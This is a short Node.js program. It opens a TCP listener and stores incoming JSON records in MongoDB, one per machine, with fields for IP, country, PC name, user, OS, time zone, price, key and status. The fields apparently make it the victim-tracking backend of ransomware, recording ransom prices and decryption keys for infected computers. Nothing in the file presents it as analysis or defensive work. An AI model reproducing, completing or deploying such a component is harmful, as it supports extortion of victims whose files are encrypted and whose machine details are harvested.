const net = require('net');
const server = net.createServer();
const mongoose = require("mongoose");
const Schema = mongoose.Schema;

mongoose.connect("mongodb://localhost:27017/usersdb", { useUnifiedTopology: true, useNewUrlParser: true }, function (err) {

    if (err) {
        return console.log(err)
    }

    server.listen(1337, '127.0.0.1');
});

const userScheme = new Schema({

    ID: String,
    IP: String,
    Country: String,
    Flag: String,
    PC: String,
    User: String,
    OS: String,
    TimeZone: String,
    DateTime: String,
    Price: String,
    Key: String,
    Status: String

}, { versionKey: false });

const Users = mongoose.model("Users", userScheme);

server.on('connection', function (socket) {

    socket.on('data', function (data) {

        var dataUser = JSON.parse(data.toString("utf8"))

        const User = new Users({

            ID: dataUser.ID,
            IP: dataUser.IP,
            Country: dataUser.Country,
            Flag: dataUser.Flag,
            PC: dataUser.PC,
            User: dataUser.User,
            OS: dataUser.OS,
            TimeZone: dataUser.TimeZone,
            DateTime: dataUser.DateTime,
            Price: dataUser.Price,
            Key: dataUser.Key,
            Status: dataUser.Status
        });

        User.save(function (err) {

            if (err) {
                return console.log(err);
            }
        });
	});
});